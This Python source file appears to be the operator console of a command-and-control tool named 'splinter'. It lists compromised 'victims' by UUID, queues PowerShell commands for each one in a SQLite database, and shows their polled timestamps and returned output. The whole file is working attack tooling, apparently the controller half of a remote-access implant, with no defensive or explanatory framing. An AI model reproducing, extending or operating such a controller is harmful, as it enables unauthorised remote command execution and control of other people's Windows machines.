import sqlite3
import texttable

DB_STRING = "splinter.db"

def main():
    print("---------\n")
    print("MAIN MENU")
    print("---------\n")
    c = ''
    while not (c == "quit" or c == 'q'):
        print("\nPossible commands:\n")
        print("v - victims")
        print("s - session <VICTIMID>")
        print("q - quit\n")
        c = input(">  ")

        if c == 'victims' or c == 'v':
            tab = texttable.Texttable()
            tab.header(['UUID','Last Command Activity'])
            for victim in listvictims():
                tab.add_row(victim)
            print(tab.draw())

        if c.startswith('session ') or c.startswith('s '):
            uuid = c.split(maxsplit = 1)[1]

            vc = ''
            while not (vc == "quit" or vc == 'q'): 
                print("\n------------")
                print("SESSION MENU")
                print("------------")
                print("\nPossible commands:\n")
                print("c  - command")
                print("lc - last_commands")
                print("r - result")
                print("q - quit\n")
                vc = input(">> ")
                    
                if vc == 'c' or vc == 'command':
                    print("Enter the command(s) you wish to run in PowerShell syntax below - Ctrl-D or Ctrl-Z ( Windows ) to end\n")
                    contents = []
                    while True:
                        try:
                            line = input()
                        except EOFError:
                            break
                        contents.append(line)
                    id = command(uuid,'\n'.join(contents))
                    print("\nCommand accepted as ID {}\n".format(id))
                     
                if vc == 'lc' or vc == 'last_commands':
                    tab = texttable.Texttable()
                    tab.header(['ID','Command Issue Time','Polled Time','Response Time','Command'])
                    for lc in last_commands(5,uuid):
                        tab.add_row(lc)
                    print(tab.draw())

                if vc.startswith('r ') or vc.startswith('result '):
                    resultid = vc.split(maxsplit = 1)[1]
                    ct,pt,rt,c,r = result(resultid)
                    if not r:
                        r = "NONE"
                    else:
                        r = r.decode("utf-8")
                    print("Timestamps:\n-----------\n\nCommand Time: {}\nPolled Time: {}\nResult Time: {}\n\nCommand:\n-----------\n\n{}\n\nResult:\n-----------\n\n{}".format(ct,pt,rt,c,r))

def listvictims():
     with sqlite3.connect(DB_STRING) as c:
        r = c.execute("SELECT uuid, datetime(response_time, 'unixepoch', 'localtime') from commands c1 where response_time = (SELECT MAX(response_time) FROM commands c2 where c1.uuid = c2.uuid) group by uuid order by response_time DESC")
        return r.fetchall()

def command(victim,command):
    with sqlite3.connect(DB_STRING) as c:
        cur = c.cursor()
        cur.execute("INSERT into commands (uuid, command_time, command) values (?, strftime('%s','now'), ?)", (victim,command))
        return cur.lastrowid

def result(id):
    with sqlite3.connect(DB_STRING) as c:
        r = c.execute("SELECT datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command, response from commands where rowid = ?", (id,))
        return r.fetchone()

def last_commands(count = 5, victim = None):
    if not victim:
        with sqlite3.connect(DB_STRING) as c:
            r = c.execute("SELECT rowid, uuid, datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command from commands order by rowid DESC limit ?", (count,))
            return r.fetchall()
    else:
        with sqlite3.connect(DB_STRING) as c:
            r = c.execute("SELECT rowid, datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command from commands where uuid = ? order by rowid DESC limit ?", (victim,count))
            return r.fetchall()

if __name__ == "__main__":
    main()
